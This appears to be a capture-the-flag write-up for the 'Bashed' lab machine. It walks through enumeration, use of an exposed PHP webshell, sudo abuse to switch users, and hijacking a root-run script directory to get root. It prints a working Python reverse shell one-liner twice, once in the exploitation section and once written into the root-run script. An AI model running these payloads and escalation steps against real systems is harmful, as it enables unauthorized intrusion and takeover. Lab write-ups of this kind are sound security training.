
## [Home](../../index.md)      [Whoami](/assets/)       [Login](/assets)      [Sign up](/assets/)
### -----------------------------------------------------------------------------------------------------------------

![bashed](/assets/basheddefault.png)

## Enumeration

Starting off with an nmap scan: `nmap -sC -sV -O -oA nmap/bashed 10.10.10.68`

Ports open:        
1. 80 - http. 

We can see that only port 80 is open. So, we can try and run our basic tools such as dirb, nikto, etc. 
After doing some enumeration, we find out that there is a webshell running on: `http://10.10.10.68/phpbash.php`. 


![bashed homepage](/assets/bashedhomepage.png)



We can navigate through the files and directories of the webshell, but we cannot switch or privesc to another user, as it spawns a new shell every time we type a new command.   
We can then use netcat to get a rev shell back to our machine and then privesc from there. 
But ncat, nc, netcat doesn't seem to work, so we tried a python shell and it worked. 
Payload used:   
    
    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash").  
  
## Exploitation
Setting up a netcat listener on our machine and then catching the shell:
![shell](/assets/shell.png)

## Privilege Escalation
After looking around the local filesystem we found out that there is a user called **scriptmanager**. 
After using `sudo -l` to list the sudo permissions which we can perform, this is what we get:  

![sudo priv](/assets/sudopriv.png)


As we can see that we can run any command as the scriptmanager user. 
Hence, we run the bash binary as the user scriptmanager to switch user to scriptmanager:  

    sudo -u scriptmanager /bin/bash.  

And we our now the user scriptmanager!   

Now we need to escalate our privileges to root. 
Again looking around in the local filesystem we find out that there is a /scripts directory in the root of the filesystem. 
We notice that there is a /scripts dir present on the machine which is odd.
-After going into that dir, we can see that there are 2 files:
---test.py. 
---test.txt. 

scriptmanager@bashed:/scripts$ cat test.py. 
cat test.py
f = open('test.txt', 'w')
f.write('testing123!')
f.close


We can then see that the test.txt file has the contents testing123!
So, now we know that the file is/can be written somehow from the py file which is present. 

So, we create a different file with the same code. 

scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open('yes.py', 'w')
f.write('lego')
f.close



-And now we can see that the file yes.py is owned by root.
-That means that whatever we execute from the yes.py file we can get root from it.


-So we can insert the same py rev shell payload which we used earlier:

scriptmanager@bashed:/scripts$ cat test.py.  
`cat test.py
f = open('yes.py', 'w')
f.write('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")')
f.close`  

Same reverse shell payload used as above. 

Now, we setup a netcat listener on our machine to catch the reverse shell:  
![root](/assets/shell2.png)

And now we are ROOT!!!!



